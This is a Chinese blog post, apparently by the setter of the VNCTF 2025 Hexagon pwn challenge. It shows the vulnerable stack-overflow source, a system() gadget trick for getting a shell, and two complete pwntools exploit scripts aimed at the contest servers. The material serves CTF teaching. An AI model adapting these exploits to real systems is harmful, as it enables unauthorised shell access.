@@ -1,0 +1,366 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
+  <meta name="msvalidate.01" content="FB02A8AFF2CE6EF90657A5C51EA59F68" />
+  
+  <title>『2025VNCTF』hexagon出题小记&amp;&amp;hexagon架构一种新的利用方式 | C_LBY&#39;s BLOG</title>
+  <meta name="author" content="鎏柏鱼">
+  
+  <meta name="description" content="0x00 前记大佬们轻点喷qaq
+这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的这篇博客（如果你是在做题的时候现学查到的先知那篇文章，没错那也是我的）下面也会讲到，这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="『2025VNCTF』hexagon出题小记&amp;&amp;hexagon架构一种新的利用方式"/>
+  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/diary" title="fashion little junk">
+			  <i class="fa fa-tasks"></i>Diary
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 『2025VNCTF』hexagon出题小记&amp;&amp;hexagon架构一种新的利用方式</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<h2 id="0x00-前记"><a href="#0x00-前记" class="headerlink" title="0x00 前记"></a>0x00 前记</h2><p>大佬们轻点喷qaq</p>
+<p>这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的<a href="https://c-lby.top/2024/2024geekctf-stkbof/">这篇博客</a>（如果你是在做题的时候现学查到的先知那篇文章，没错那也是我的）下面也会讲到，这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。</p>
+<p>鉴于VNCTF是招新赛，也算是半个新生赛了（确信），所以题目难度降了又降。从一开始的极少栈空间，到给多一定栈空间可以有机会通过多次栈迁移攻击，到最后连log都给出来了，免去了选手爆破栈地址的痛苦，十个左右的解是符合预期的。</p>
+<p>所以这道题总共有两种解法，虽然我很希望有选手能够通过除了栈迁移之外的打法做出这道题，但是遗憾的的是似乎大家都参照了先知的文章用栈迁移打通的。栈迁移打法的脚本在文章最后。</p>
+<h2 id="0x01-程序运行与调试"><a href="#0x01-程序运行与调试" class="headerlink" title="0x01 程序运行与调试"></a>0x01 程序运行与调试</h2><ol>
+<li>首先qemu-user的安装是有必要的，里面包含了qemu-hexagon，这是程序运行的基础设施</li>
+<li>第二步是将libc链接到&#x2F;lib里<code>sudo ln -sf libc.so /lib/ld-musl-hexagon.so.1</code></li>
+<li>第三步运行程序qemu-hexagon .&#x2F;main就能运行起来了</li>
+<li>调试程序实测gdb-mutilarch用不了，所以建议不折腾用qemu本身的调试功能来调试，这里给出其中一种信息较详细的调试命令<code>qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20420+0xc0 -strace -D ./log ./main</code></li>
+<li>题目没给出源码，如果要在IDA反汇编看代码，需要借助<a target="_blank" rel="noopener" href="https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z">插件</a></li>
+</ol>
+<h2 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h2><p>按照国际惯例先给出源码，其实也非常简单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> vul_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> pad;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> key;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    read(<span class="number">0</span>, vul_buf, <span class="number">16</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/ctf/log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome back, hexagon player!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-新的利用方式"><a href="#0x03-新的利用方式" class="headerlink" title="0x03 新的利用方式"></a>0x03 新的利用方式</h2><p>这可能并不能是新的利用方式，毕竟这种形式的类ogg在各个libc里都挺常见的，只是用的比较少。但至少在hexagon架构里有一定好处，hexagon的指令集中是没有pop和push的，所以不能像x86_64那样构造ROP直接控制寄存器，而是要通过栈（迁移）来控制寄存器。在<strong>栈容量较小的时候</strong>还是太吃操作了，主包还有没有更简单的方法。有的兄弟有的。</p>
+<p>我们在libc.so中先找到&#x2F;bin&#x2F;sh，然后看他的引用，跳到system函数上，可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:000BE7C0                 &#123; r3 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE7C4                 &#123; r0 = add(pc, ##aSh@pcrel) &#125; // &quot;sh&quot;</span><br><span class="line">.text:000BE7CC                 &#123; memw(fp + #var_420) = r0 &#125;</span><br><span class="line">.text:000BE7D0                 &#123; r0 = add(pc, ##aC_0@pcrel) &#125; // &quot;-c&quot;</span><br><span class="line">.text:000BE7D8                 &#123; memw(fp + #var_41C) = r0 &#125;</span><br><span class="line">.text:000BE7DC                 &#123; r0 = memw(fp + #var_10) &#125;</span><br><span class="line">.text:000BE7E0                 &#123; memw(fp + #var_418) = r0 &#125;</span><br><span class="line">.text:000BE7E4                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE7E8                 &#123; memw(fp + #var_414) = r2 &#125;</span><br><span class="line">.text:000BE7EC                 &#123; r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) &#125;</span><br><span class="line">.text:000BE7F4                 &#123; r0 = memw(r0 + ##-0x102F4) &#125;</span><br><span class="line">.text:000BE7FC                 &#123; r5 = memw(r0) &#125;</span><br><span class="line">.text:000BE800                 &#123; r1 = add(pc, ##aBinSh@pcrel) &#125; // &quot;/bin/sh&quot;</span><br><span class="line">.text:000BE808                 &#123; r0 = add(fp, #-0x14) &#125;</span><br><span class="line">.text:000BE80C                 &#123; r4 = add(fp, #-0x420) &#125;</span><br><span class="line">.text:000BE810                 &#123; call posix_spawn &#125;</span><br><span class="line">.text:000BE818                 &#123; r1 = r0 &#125;</span><br><span class="line">.text:000BE81C                 &#123; r0 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE820                 &#123; memw(fp + #var_2C0) = r1 &#125;</span><br><span class="line">.text:000BE824                 &#123; call posix_spawnattr_destroy &#125;</span><br><span class="line">.text:000BE82C                 &#123; r0 = memw(fp + #var_2C0) &#125;</span><br><span class="line">.text:000BE830                 &#123; p0 = cmp.eq(r0, #0) &#125;</span><br><span class="line">.text:000BE834                 &#123; p0 = not(p0) &#125;</span><br><span class="line">.text:000BE838                 &#123; if (p0) jump loc_BE8A4 &#125;</span><br><span class="line">.text:000BE83C                 &#123; jump loc_BE840 &#125;</span><br><span class="line">.text:000BE840 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE840</span><br><span class="line">.text:000BE840 loc_BE840:                              // CODE XREF: system+1CC↑j</span><br><span class="line">.text:000BE840                 &#123; jump loc_BE844 &#125;</span><br><span class="line">.text:000BE844 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE844</span><br><span class="line">.text:000BE844 loc_BE844:                              // CODE XREF: system:loc_BE840↑j</span><br><span class="line">.text:000BE844                                         // system:loc_BE89C↓j</span><br><span class="line">.text:000BE844                 &#123; r0 = memw(fp + #var_14) &#125;</span><br><span class="line">.text:000BE848                 &#123; r1 = add(fp, #-0x2BC) &#125;</span><br><span class="line">.text:000BE84C                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE850                 &#123; call waitpid &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是system函数执行命令的逻辑是<code>/bin/sh -c xxxx</code>，而这个xxxx命令会从fp-0x10中取。那么我只需要满足以下三点就能执行<code>/bin/sh -c /bin/sh</code>了</p>
+<ol>
+<li>栈上写0x3FED19F7（libcbase&#x3D;0x3FEC0000，则0x3FED19F7是&#x2F;bin&#x2F;sh字符串）</li>
+<li>控制好fp（类似rbp寄存器）使得[fp-0x10]精准命中栈上的0x3FED19F7</li>
+<li>劫持返回地址为libcbase+0xBE7C0，也就是上面这个gadget的开始（不同版本的libc偏移可能存在差异）</li>
+</ol>
+<p>也就是说我们只需要得知栈地址和libc地址就能轻松getshell，而这两个地址在qemu环境下一点也不难得知，更何况本题给出了log，log中记载了当次程序运行的所有系统调用情况，我们通过查看read调用就能找到栈地址。libc地址同理，有很多方法可以获取。这样的方法免去了调试栈迁移的痛苦。</p>
+<p>hexagon这道题其实有点就题出题的意思在里面，给了scanf就是为了给选手输入0x3FED19F7到[fp-0x10]的（赤裸裸的明示）。实际上只要题目能够输入4*3字节并能覆盖fp和返回地址，就能使用这种方法getshell，或者执行其他命令。</p>
+<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&#x27;qemu-hexagon&#x27;, &#x27;-L&#x27;, &#x27;libc&#x27;, &#x27;-d&#x27;, &#x27;in_asm,exec,cpu,nochain&#x27;, &#x27;-singlestep&#x27;,</span></span><br><span class="line"><span class="comment">#             &#x27;-dfilter&#x27;, &#x27;0x20420+0xc0&#x27;, &#x27;-strace&#x27;, &#x27;-D&#x27;, &#x27;./log&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">r = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">43815</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4080e9d8</span> <span class="comment"># 栈地址在ubuntu22的qemu下可能会变</span></span><br><span class="line">libc_base = <span class="number">0x3FEC0000</span> <span class="comment"># libc地址不会变</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh).encode())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">2</span> + p32(stack+<span class="number">8</span>)+p32(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-栈迁移方法的EXP"><a href="#0x05-栈迁移方法的EXP" class="headerlink" title="0x05 栈迁移方法的EXP"></a>0x05 栈迁移方法的EXP</h2><p>出题人最近比较忙所以直接贴出本题一血的栈迁移脚本。绝对不是因为出题人懒哟。绝对不是哟。</p>
+<p>为了不误导大家，脚本中原先存在的部分注释被删掉了，请大家自行调试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;neww&#x27;</span>]</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">all_logs = []</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment"># sh = process(filename)</span></span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20460+0x40&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">47998</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(sh)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid, params)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+											<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
+        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
+    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
+</div>
+							</div>
+
+							
+									
+										<span data-path="/2025/2025vnctf-hexagon/">
+											<em class="post-meta-item-text"> Page View <i
+													class="waline-pageview-count"></i></em>
+										</span>
+
+										
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/hexagon-toolchain-env/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+											
+													
+														<section id="comments" class="comments">
+															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+  var walineConfig = 
+    walineConfig.el='#waline';
+  Waline.init(walineConfig);
+</script> -->
+
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+  init({
+    enable: true,
+    el: '#waline',
+    serverURL: 'https://blog-s-comment-three.vercel.app',
+    dark: true,
+    pageview: true,
+    lang: 'zh-CN',
+    requiredMeta: ['nick', 'mail'],
+    locale:
+      { placeholder: 'Say something……' },
+    highlighter: true,
+    search: false,
+    emoji: [
+      '//unpkg.com/@waline/emojis@1.2.0/weibo',
+      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
+      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
+      'https://unpkg.com/@waline/emojis@1.2.0/qq',
+    ],
+    imageUploader: false,
+  });
+</script>
+														</section>
+														
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+					
+						<div id="side_meta">
+							<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-02-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/WP/">WP<span>15</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>26</span></a></li> <li><a href="/tags/PWN/">PWN<span>30</span></a></li> <li><a href="/tags/WP/">WP<span>19</span></a></li> <li><a href="/tags/hexagon/">hexagon<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x00-%E5%89%8D%E8%AE%B0"><span class="toc-article-text">0x00 前记</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="toc-article-text">0x01 程序运行与调试</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-%E6%BA%90%E7%A0%81"><span class="toc-article-text">0x02 源码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x03-%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-article-text">0x03 新的利用方式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x04-EXP"><span class="toc-article-text">0x04 EXP</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x05-%E6%A0%88%E8%BF%81%E7%A7%BB%E6%96%B9%E6%B3%95%E7%9A%84EXP"><span class="toc-article-text">0x05 